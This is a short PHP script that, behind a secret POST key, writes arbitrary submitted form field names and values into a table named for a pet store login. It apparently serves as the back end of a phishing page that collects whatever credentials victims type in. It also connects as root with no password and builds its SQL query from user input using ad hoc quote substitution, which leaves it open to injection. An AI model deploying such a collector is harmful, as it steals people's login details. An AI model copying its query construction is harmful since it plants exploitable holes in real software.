<?php
$con= mysqli_connect('localhost', 'root', '', 'skybase') or die('connection failed' .mysqli_connect_error());
if($_POST['instgame']=='melboru')
{
    $doe=date('Y-m-d');
    date_default_timezone_set('Asia/Kolkata');
    $toe=date( 'H:i:s', time () );
    $ip= getHostByName(getHostName());
    $field=explode("[s~1]",$_POST['fielddata']);
    $values=explode("[s~1]",$_POST['fieldvalues']);

    for ($x = 0; $x < count($field); $x++){
        $field[$x] = str_replace("'",'>>*7&',$field[$x]);
        $field[$x] = str_replace('"','>>*7&<<',$field[$x]);
        $values[$x] = str_replace("'",'>><<*7&',$values[$x]);
        $values[$x]= str_replace('"','<<>>*7&',$values[$x]);
        $sql= "INSERT INTO `satoshi_pet_store_login` (`fieldname`, `details`,`doe`,`toe`,`ip`) VALUES ('$field[$x]','$values[$x]', '$doe', '$toe', '$ip')";
        $query = mysqli_query($con,$sql);
    }
}
else {
    echo("Trying to Hack ?");
}
?>
